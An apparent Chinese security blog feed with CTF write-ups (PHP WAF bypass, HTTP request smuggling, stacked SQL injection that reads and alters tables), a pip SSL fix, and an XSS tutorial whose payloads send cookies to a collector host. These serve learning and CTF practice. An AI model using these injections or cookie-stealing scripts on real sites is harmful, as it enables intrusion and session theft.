    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><a id="more"></a><h2 id="方法一：PHP特性"><a href="#方法一：PHP特性" class="headerlink" title="方法一：PHP特性"></a>方法一：PHP特性</h2><p>在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。</p><p>由于过滤了“ / ”，我们构造payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).f1agg))</span><br></pre></td></tr></table></figure><h2 id="方法二：HTTP走私"><a href="#方法二：HTTP走私" class="headerlink" title="方法二：HTTP走私"></a>方法二：HTTP走私</h2><p>看wp这道题还有HTTP走私这种方法，所以想来重点记录下</p><h3 id="HTTP走私原理"><a href="#HTTP走私原理" class="headerlink" title="HTTP走私原理"></a>HTTP走私原理</h3><p>​    在HTTP1.1之后，HTTP规定了两种标识来表示请求结束，分别是 Content-Length（CL）标头和Transfer-Encoding（TE）标头</p><p>​    CL：以字节为单位指定消息内容体的长度。</p><p>​    TE：指定消息体使用分块编码（ChunkedEncode），即 Transfer-Encoding：chunked ，也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟CRLF（\r\n），然后是块内容，最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><p>​    当我发送请求，包含Content-Length，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了Transfer-Encoding，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的waf。</p><h3 id="HTTP走私的四种方法"><a href="#HTTP走私的四种方法" class="headerlink" title="HTTP走私的四种方法"></a>HTTP走私的四种方法</h3><h4 id="CL不为0时"><a href="#CL不为0时" class="headerlink" title="CL不为0时"></a>CL不为0时</h4><p>这种情况一般发生在get请求下，当前端允许content-length，后端不允许时，此时后端服务器就不会解析content-length，这样就可能绕过waf。</p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p>这种利用的前提条件是服务器不会返回400错误。但是前端服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理,这样便有可能引发请求走私。比如出现下面这种情况时：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span>: 68</span><br><span class="line"><span class="attribute">Content-Length</span>: 5</span><br><span class="line"> </span><br><span class="line">num=1GET /calc.php?num=1 HTTP/1.1</span><br><span class="line"><span class="attribute">123456</span></span><br></pre></td></tr></table></figure><p>前端先解析第一个cl为68，就会把下面的“num=1GET/calc.php?num=1 HTTP/1.1”都当做请求的内容。但是后端会解析第二个cl，也就是说后端只解析“num=1” 后面的请求体就作为下次请求的请求头（前提是Connection:keep-alive）。这样就会引发走私。</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，而后端服务器会忽略掉Content-Length，处理Transfer-Encoding这一请求头。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span>: 123</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></table></figure><p>这里的chunked对请求内容进行分块编码，并且直到有\r\n的时候才结束。</p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p>参考文章：<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p><hr><p>回到这道题，因为是get请求，而CL字段只有在post请求时才会有用，所以我们利用TE字段来绕过前端的waf</p><p><img src="https://i.loli.net/2021/01/12/KbxzFBj6M7adSGm.png" alt="image-20210112114930755"></p><p>在数据部分必须要加一个换行，来标识请求的结束，Connection也要改为keep-live</p><p>但是经过我的测试发现使用两个CL字段也可以进行绕过前端的waf</p><p><img src="https://i.loli.net/2021/01/12/FxA6fmstJRy4dK1.png" alt="image-20210112115225675"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h1&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="HTTP走私" scheme="http://goudanjun.vip/tags/HTTP%E8%B5%B0%E7%A7%81/"/>
    
  </entry>
  
  <entry>
    <title>[强网杯 2019]随便注</title>
    <link href="http://goudanjun.vip/2021/01/17/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8.html/"/>
    <id>http://goudanjun.vip/2021/01/17/强网杯-2019-随便注.html/</id>
    <published>2021-01-17T12:22:13.000Z</published>
    <updated>2021-01-17T13:02:00.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>考点：堆叠注入</p><a id="more"></a><p>​        堆叠注入就是可以在一条sql语句后加分号，分号之后的就是一个全新的sql语句。但是使用条件十分有限，只有PHP的站在使用mysqli_multi_query()函数时，会同时解析多条语句。往往PHP的站会使用mysqli_ query()函数来限制只能执行一条语句，从而防止sql注入。</p><p>根据返回报错：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure><p>尝试堆叠注入</p><p>查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; <span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>还可以使用语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; desc `1919810931114514`<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>注意当数字作为表名的时候，需要用反引号括起来。这里可以看到有flag字段，之后有三种方法可以获得flag。</p><p><img src="https://i.loli.net/2021/01/11/3Knxpz8MwAFNkqI.png" alt="QQ截图20210111111410"></p><h2 id="方法一：更改表名和列名"><a href="#方法一：更改表名和列名" class="headerlink" title="方法一：更改表名和列名"></a>方法一：更改表名和列名</h2><ol><li><p>将表名words换为其他的，类似于word1</p></li><li><p>将表名1919810931114514换为words</p></li><li><p>将列名flag换为id</p><p>构造语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' ; </span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`word1`</span> ;      </span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span> ;  </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>更改列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert table `words` <span class="keyword">rename</span> <span class="string">`flag`</span> <span class="keyword">to</span> <span class="string">`id`</span>;</span><br></pre></td></tr></table></figure><p>再进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/6Mi7CVoEzxd3LTD.png" alt="QQ截图20210111112336"></p></li></ol><h2 id="方法二：绕过select限制"><a href="#方法二：绕过select限制" class="headerlink" title="方法二：绕过select限制"></a>方法二：绕过select限制</h2><p>使用<strong>预编译</strong>的方式</p><blockquote><p>set  用于设置变量名和值</p><p>prepare  用于预备一个语句，并赋予名称，以后可以引用该语句</p><p>execute  执行语句</p><p>deallocate prepare  用来释放掉预处理的语句</p></blockquote><p>构造payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span> = <span class="keyword">CONCAT</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`;'</span>);</span><br><span class="line"><span class="keyword">prepare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/TajpPA945koYRzn.png" alt="QQ截图20210111114359"></p><p>strstr函数不会识别大小写，所以我们进行大小写绕过即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">Set</span> @<span class="keyword">sql</span> = <span class="keyword">CONCAT</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`;'</span>);</span><br><span class="line"><span class="keyword">prePare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>还可以将“select * from <code>1919810931114514</code>”16进制编码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">SeT</span> @<span class="keyword">sql</span>=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prepare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/HrJGOV6ULQWFRhg.png" alt="QQ截图20210111115502"></p><h2 id="方法三：使用handler绕过"><a href="#方法三：使用handler绕过" class="headerlink" title="方法三：使用handler绕过"></a>方法三：使用handler绕过</h2><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/11/yf3neJBNulXFIKj.png" alt="QQ截图20210111124042"></p><p>注：handler用法</p><p>​    handler是MySQL中特有的语法，可代替select对表中的数据进行逐行的查询</p><p>​    基本语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">#FIRST获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过索引去查看的话可以按照一定的顺序，获取表中的数据。</span><br><span class="line">通过索引列指定一个值，可以指定从哪一行开始。</span><br><span class="line">通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</span><br><span class="line">如果我们不想浏览一个表的所有行，可以使用where和limit子句。</span><br></pre></td></tr></table></figure><p>参考链接 : <a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;强网杯-2019-随便注&quot;&gt;&lt;a href=&quot;#强网杯-2019-随便注&quot; class=&quot;headerlink&quot; title=&quot;[强网杯 2019]随便注&quot;&gt;&lt;/a&gt;[强网杯 2019]随便注&lt;/h1&gt;&lt;p&gt;考点：堆叠注入&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="SQL注入" scheme="http://goudanjun.vip/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="堆叠注入" scheme="http://goudanjun.vip/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python3安装第三方包时ssl报错</title>
    <link href="http://goudanjun.vip/2021/01/17/python3%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E6%97%B6ssl%E6%8A%A5%E9%94%99.html/"/>
    <id>http://goudanjun.vip/2021/01/17/python3安装第三方包时ssl报错.html/</id>
    <published>2021-01-17T09:53:25.000Z</published>
    <updated>2021-01-17T13:03:23.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><blockquote><p>错误：CouldnotfetchURL<a href="https://pypi.python.org/simple/pytest-xdist/" target="_blank" rel="noopener">https://pypi.python.org/simple/pytest-xdist/</a>: There wasaproblem confirmingthessl certificate: [SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocolversion(_ssl.c:590)</p></blockquote><a id="more"></a><p>原因：python.org已经不支持TLSv1.0和TLSv1.1，需要升级pip，但是pip用不了，所以手动升级</p><p>解决方案：</p><p>1.mac或者linux操作系统：在终端下执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/get-pip.py | python3</span><br></pre></td></tr></table></figure><p>2.windows操作系统：从<a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a> 下载get-pip.py文件，然后使用python运行这个文件python get-pip.py</p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><blockquote><p>错误：Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by ‘SSLError(SSLError(1, u’[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:661)’),)’</p></blockquote><p>原因：可能用国外镜像源连接不好</p><p>解决方案：</p><p>1.mac或者linux操作系统：</p><p>修改 ~/.pip/pip.conf (没有就创建一个)， 更换 index-url</p><blockquote><p>[global]</p><p> index-url = <a href="http://pypi.douban.com/simple" target="_blank" rel="noopener">http://pypi.douban.com/simple</a></p></blockquote><p>2.windows操作系统：</p><p>直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini，内容同上</p><p>附：镜像源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">阿里云 http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line"></span><br><span class="line">豆瓣 http://pypi.douban.com/simple</span><br><span class="line"></span><br><span class="line">Python官方 https://pypi.python.org/simple/</span><br><span class="line"></span><br><span class="line">v2ex http://pypi.v2ex.com/simple/</span><br><span class="line"></span><br><span class="line">中国科学院 http://pypi.mirrors.opencas.cn/simple/</span><br><span class="line"></span><br><span class="line">清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><blockquote><p>错误：Could not fetch URL <a href="https://pypi.org/simple/pip/" target="_blank" rel="noopener">https://pypi.org/simple/pip/</a>: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=’pypi.org’, port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(SSLError(1, ‘[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:833)’),)) - skipping</p></blockquote><p>原因：在最新的 pip 版本(&gt;=7)中，使用镜像源时，会提示源地址不受信任或不安全</p><p>解决方案1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org 包名</span><br></pre></td></tr></table></figure><p>解决方案2：(推荐)</p><p>在第二个解决方案中：添加一项配置</p><blockquote><p>[install]</p><p>trusted-host=<a href="http://pypi.douban.com/simple" target="_blank" rel="noopener">http://pypi.douban.com/simple</a></p></blockquote><p>参考链接：<a href="https://www.jianshu.com/p/6f6c640b0371" target="_blank" rel="noopener">https://www.jianshu.com/p/6f6c640b0371</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;错误：CouldnotfetchURL&lt;a href=&quot;https://pypi.python.org/simple/pytest-xdist/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pypi.python.org/simple/pytest-xdist/&lt;/a&gt;: There wasaproblem confirmingthessl certificate: [SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocolversion(_ssl.c:590)&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://goudanjun.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞总结及实战</title>
    <link href="http://goudanjun.vip/2021/01/10/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%8F%8A%E5%AE%9E%E6%88%98.html/"/>
    <id>http://goudanjun.vip/2021/01/10/XSS漏洞总结及实战.html/</id>
    <published>2021-01-10T03:07:53.000Z</published>
    <updated>2021-03-18T09:21:42.747Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss攻击原理"><a href="#xss攻击原理" class="headerlink" title="xss攻击原理"></a><strong>xss攻击原理</strong></h2><p>​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。</p><a id="more"></a><p>​    xss攻击的最终目的是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是JavaScript语言，但也会使用其他互联网客户端脚本代码，例如：ActionScript，VBscript。而如今的互联网客户端脚本代码基本是基于JavaScript，所以要想深入研究xss，必须精通JavaScript。JavaScript可以用来获取用户的Cooike，改变网页的内容，弹出窗口那么存在xss漏洞的网站，xss就可以用来盗取Cooike，黑掉页面，导航到恶意网站！甚至可以完全监控你的键盘操作，模仿windows注销界面，诱导你输入开机密码！而攻击者需要做的仅仅是向你的代码中注入JavaScript代码！</p><h2 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a><strong>xss的危害</strong></h2><ol><li>网络钓鱼，包括盗取各类用户账号</li><li>窃取用户Cooikes，利用管理员身份进一步对网站执行操作：</li><li>劫持会话，从而执行任意的操作，例如非法转账，强制发表日志，发送电子邮件：</li><li>强制弹广告，刷流量等（黑帽SEO）</li><li>海量客户端攻击（比如DDOS）</li><li>获取客户端信息，比如IP地址，开放端口，网页浏览历史；</li><li>传播跨站脚本蠕虫</li><li>结合其他漏洞，如CSRF漏洞</li></ol><h2 id="xss攻击分类"><a href="#xss攻击分类" class="headerlink" title="xss攻击分类"></a><strong>xss攻击分类</strong></h2><p>主要分为三大类：反射型，DOM型，储存型</p><p><strong>反射型</strong>：（服务器端 ）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=$_GET[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> $username;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">#在这段代码中程序接受username值，并且输出，如果提交xss.php? username=zhangsan,那么程序并没有进行xss代码过滤，最终造成了反射型xss漏洞</span></span><br></pre></td></tr></table></figure><p><strong>DOM型</strong>：（在客户端上进行攻击）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> urls=<span class="built_in">document</span>.URL;<span class="comment">//获取URL</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> index=<span class="built_in">document</span>.URL.indexOf(<span class="string">"url="</span>)+<span class="number">4</span>；</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> par = urls.substring(index);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(par));<span class="comment">//输入获取内容</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上面代码的意思是获取URL中的urls参数的值，并且输出，如果输入http://host/domxss.php?url=&lt;script&gt;alert(/xss/)&lt;/script&gt;就可触发xss攻击的发生--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>储存型</strong>：</p><p>与反射型相比，唯一的区别就是xss代码被存入了数据库中，在下次浏览时，又被读取出来</p><p>相对反射型，一般来说储存型的危害更大</p><p>真实案例：wooyun-2014-83651 凤凰网储存xss</p><h2 id="xss测试技巧"><a href="#xss测试技巧" class="headerlink" title="xss测试技巧"></a><strong>xss测试技巧</strong></h2><p><strong>工具检查</strong>: APPSCAN,AWVS,BurpSuit等综合型的扫描工具，但不如专门的xss检测工具（XSSER、XSSF、NoXss）效率高，不能检测储存型的xss漏洞</p><p><strong>手工测试</strong>：</p><p>常用的xss攻击脚本：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"xss test!"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://localhost/xss_savecookie.asp?xcookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>'<span class="attr">test</span>')&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.write(document.cookie)</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:83/xss_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>点击察看详情<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http://localhost/xss_savecookie.asp?xcookie=ASPSESSIONIDAARDBTAQ=HGOPGOPCEKEPHHDEBPHJPGLB;%20gbtoyAtBD=4;%20gbtoyTime=2012%2D6%2D11+23%3A33%3A29;%20gbtoy=pass=123456&amp;user=linhai</span><br><span class="line"></span><br><span class="line">http://192.168.24.250:81/cookiesave/XSS_savecookie.asp    &amp;lt  <span class="tag">&lt;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:81/cookiesave/XSS_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>情景一:可得知输出位置</p><p>使用手工测试web应用程序是否存在xss漏洞时，最重要的是考虑哪里有输入，输入的数据在哪里进行输出*。</p><p>在进行手工测试xss时，一定要选择有特殊意义的字符，这样可以快速检测是否存在xss，比如说测试某输入框是否存在xss漏洞，不要直接输入xss跨站语句进行测试，一步一步来更便于测试和分析。</p><p>比如：输入一些敏感字符，例如：<strong>&lt;,&gt;,’,”,(,)</strong> 等，在提交请求后去查看html源代码，看这些输入的字符是否被转义。</p><p>在输入这些字符的时候，很有可能程序已经做了过滤，那么你再寻找就不那么容易了，只是可以输入“<strong>xsser&lt;&gt;”‘&amp;</strong>”这样的字符串，然后在查找源代码的时候直接查找xsser来去定位，避免被过滤掉之后就找不到输出的位置了。</p><p> 情景二：无法得知输出位置</p><p>非常多的web应用程序源代码是不对外开放的，这时进行xss时就有可能无法得知输入数据在哪显示、</p><p>对于这种情况通常采用万能输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"/&gt;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span 